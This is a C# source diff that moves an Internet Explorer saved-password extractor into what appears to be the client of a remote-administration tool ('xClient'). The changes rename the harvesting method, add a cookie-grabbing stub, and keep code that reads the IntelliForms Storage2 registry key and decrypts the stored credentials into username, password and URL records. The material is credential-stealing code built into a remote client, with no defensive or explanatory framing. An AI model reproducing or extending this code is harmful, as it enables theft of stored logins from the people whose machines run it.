@@ -7,14 +7,14 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 using Microsoft.Win32;
-using xClient.Core.Recovery.Helper;
+using xClient.Core.Utilities;
 
-namespace PasswordRecovery.Browsers
+namespace xClient.Core.Recovery.Browsers
 {
     public static class InternetExplorer
     {
         #region Public Members
-        public static List<LoginInfo> Passwords()
+        public static List<LoginInfo> GetSavedPasswords()
         {
             List<LoginInfo> data = new List<LoginInfo>();
 
@@ -30,10 +30,9 @@ namespace PasswordRecovery.Browsers
                         {
                             if (DecryptIePassword(item.UrlString, dataList))
                             {
-
                                 foreach (string[] loginInfo in dataList)
                                 {
-                                    data.Add(new LoginInfo() { Username = loginInfo[0], Password = loginInfo[1], URL = item.UrlString, Browser = "Internet Explorer" });
+                                    data.Add(new LoginInfo() { Username = loginInfo[0], Password = loginInfo[1], URL = item.UrlString, Application = "InternetExplorer" });
                                 }
                             }
                         }
@@ -51,13 +50,17 @@ namespace PasswordRecovery.Browsers
 
             return data;
         }
+        
+        public static List<LoginInfo> GetSavedCookies()
+        {
+            return new List<LoginInfo>();
+        }
         #endregion
         #region Private Methods
         private const string KeyStr = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
 
         static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
         {
-
             GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
             T stuff = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
             handle.Free();
@@ -66,7 +69,6 @@ namespace PasswordRecovery.Browsers
         }
         static bool DecryptIePassword(string url, List<string[]> dataList)
         {
-
             //Get the hash for the passed URL
             string urlHash = GetURLHashString(url);
 
